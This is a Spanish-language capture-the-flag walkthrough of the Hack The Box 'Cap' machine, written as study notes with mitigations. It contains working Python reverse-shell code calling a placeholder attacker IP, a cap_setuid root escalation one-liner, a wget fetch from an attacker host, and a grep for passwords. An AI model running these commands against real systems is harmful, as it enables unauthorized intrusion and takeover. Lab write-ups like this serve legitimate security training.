# Writeup - Máquina CAP (HTB)

## Resumen Ejecutivo
Máquina Linux de dificultad fácil que explota **incorrectas asignaciones de capacidades (Capabilities)** en binarios del sistema, permitiendo escalada de privilegios mediante Python con capacidad `cap_setuid`.

---

## 1. Reconocimiento Inicial

### 1.1 Enumeración de Puertos
```bash
nmap -sC -sV -p- 10.10.10.245
```

**Resultados clave:**
```
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
```

### 1.2 Análisis de Servicios

#### **Puerto 80 - HTTP**
- Servidor web con dashboard de network monitoring
- Incluye gráficos de tráfico y configuraciones de red
- Posibilidad de captura de paquetes en tiempo real

#### **Puerto 21 - FTP**
- Servicio FTP activo
- Credenciales potenciales o configuración expuesta

---

## 2. Explotación Inicial

### 2.1 Enumeración Web
Al navegar a `http://10.10.10.245`, encontramos:

1. **Dashboard de seguridad de red**
2. **Sección de captura de paquetes**
3. **Configuración de interfaz de red**

### 2.2 Vulnerabilidad Clave: Captura de Paquetes sin Autenticación
La funcionalidad de captura de paquetes está disponible en:
```
http://10.10.10.245/data/0
http://10.10.10.245/data/1
http://10.10.10.245/data/2
```

### 2.3 Extracción de Credenciales FTP
1. Iniciamos captura de paquetes en la interfaz de red
2. Accedemos a los datos en tiempo real
3. Encontramos tráfico FTP con credenciales:

```
FTP Credentials:
USER: nathan
PASS: Buck3tH4TF0RM3!
```

---

## 3. Acceso Inicial al Sistema

### 3.1 Conexión FTP
```bash
ftp 10.10.10.245
# Usuario: nathan
# Contraseña: Buck3tH4TF0RM3!
```

### 3.2 Shell Reversa
Desde la sesión FTP, podemos descargar un archivo o intentar ejecutar comandos. Sin embargo, es más efectivo obtener una shell completa:

1. **Crear script Python para reverse shell:**
```python
#!/usr/bin/python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("TU_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

2. **Transferir al sistema:**
```bash
# Desde nuestro atacante
python3 -m http.server 80

# Desde FTP
ftp> put shell.py
```

3. **Ejecutar shell:**
```bash
python3 shell.py
```

### 3.3 Shell Estable
Obtenemos acceso como usuario `nathan`:
```bash
nathan@cap:~$ whoami
nathan
nathan@cap:~$ pwd
/home/nathan
```

---

## 4. Escalada de Privilegios

### 4.1 Concepto Clave: Linux Capabilities
Las **capabilities** en Linux son permisos granulares que se pueden asignar a procesos y binarios. A diferencia de `SUID` que da todos los privilegios de root, las capabilities permiten privilegios específicos.

**Capabilities relevantes:**
- `cap_setuid`: Permite cambiar el UID del proceso
- `cap_net_bind_service`: Permite enlazar a puertos privilegiados (<1024)
- `cap_net_raw`: Permite usar sockets RAW y PACKET

### 4.2 Enumeración de Capabilities
```bash
# Buscar binaries con capabilities
getcap -r / 2>/dev/null
```

**Resultado crítico:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### 4.3 ¿Por qué esto es peligroso?
- `cap_setuid`: Permite cambiar el User ID del proceso
- Python puede ejecutar código arbitrario
- Combinados, permiten convertir cualquier proceso Python en root

### 4.4 Explotación
```bash
# Opción 1: Shell directa como root
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Opción 2: Reverse shell como root
/usr/bin/python3.8 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("TU_IP",4444))
os.setuid(0)
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'
```

### 4.5 Explicación del Payload
```python
import os
# Cambiamos UID a 0 (root)
os.setuid(0)
# Ejecutamos bash con privilegios de root
os.system("/bin/bash")
```

**¿Cómo funciona?**
1. Python ejecuta con UID de nathan (1000)
2. `cap_setuid` permite cambiar el UID efectivo
3. Cambiamos a UID 0 (root)
4. Ejecutamos bash con los nuevos privilegios

---

## 5. Captura de Flags

### 5.1 User Flag
```bash
nathan@cap:~$ cat user.txt
[REDACTED]
```

### 5.2 Root Flag
```bash
root@cap:~# cat /root/root.txt
[REDACTED]
```

---

## 6. Análisis de la Vulnerabilidad

### 6.1 Root Cause
1. **Configuración insegura:** Asignar `cap_setuid` a Python
2. **Falta de hardening:** No aplicar principio de mínimo privilegio
3. **Exposición de servicio:** FTP con credenciales en tráfico de red

### 6.2 Mitigaciones
1. **Revisar capabilities asignadas:**
```bash
# Listar todas las capabilities
getcap -r / 2>/dev/null

# Remover capabilities peligrosas
setcap -r /usr/bin/python3.8
```

2. **Monitoreo de tráfico de red:**
   - Usar HTTPS/TLS para tráfico administrativo
   - Autenticación fuerte para dashboard web

3. **Principio de mínimo privilegio:**
   - Asignar solo capabilities necesarias
   - Usar contenedores o namespaces para aislamiento

---

## 7. Aprendizajes Clave

### 7.1 Linux Capabilities
- Alternativa más segura que SUID/SGID
- Permiten privilegios granulares
- Mal configuradas son tan peligrosas como SUID

### 7.2 Enumeración Post-Explotación
```bash
# Buscar archivos SUID/SGID
find / -perm -4000 2>/dev/null

# Buscar capabilities
getcap -r / 2>/dev/null

# Buscar tareas cron
ls -la /etc/cron*

# Buscar archivos de configuración
find / -name "*.conf" -type f 2>/dev/null | head -20
```

### 7.3 Python en Post-Explotación
Python es extremadamente útil para:
- Escalada de privilegios
- Transferencia de archivos
- ByPASSeo de restricciones
- Creación de herramientas ad-hoc

---

## 8. Comandos Útiles para Máquinas HTB

### 8.1 Enumeración
```bash
# Escaneo completo
nmap -sC -sV -p- -oA fullscan IP

# Buscar vulnerabilidades web
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt

# Ver versiones de servicios
searchsploit "service version"
```

### 8.2 Post-Explotación
```bash
# Shell estable
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Transferir archivos
python3 -m http.server 8000
wget http://ATACANTE:8000/archivo

# Buscar información sensible
grep -r "password" /etc/ 2>/dev/null
```

---

## 9. Conclusión

La máquina CAP demuestra la importancia de:
1. **Configurar correctamente las capabilities** en sistemas Linux
2. **No transmitir credenciales en texto claro** en servicios de red
3. **Realizar hardening básico** en servicios expuestos
4. **Monitorear el tráfico de red** en dashboards administrativos

La combinación de una capability peligrosa (`cap_setuid`) en un intérprete poderoso (Python) resultó en una fácil escalada de privilegios, mostrando cómo pequeños errores de configuración pueden comprometer completamente un sistema.

---

**Notas para Obsidian:**
- Usar etiquetas: #htb #cap #linux #capabilities #privesc
- Enlazar con otras máquinas que usen capabilities
- Crear plantilla para post-explotación Linux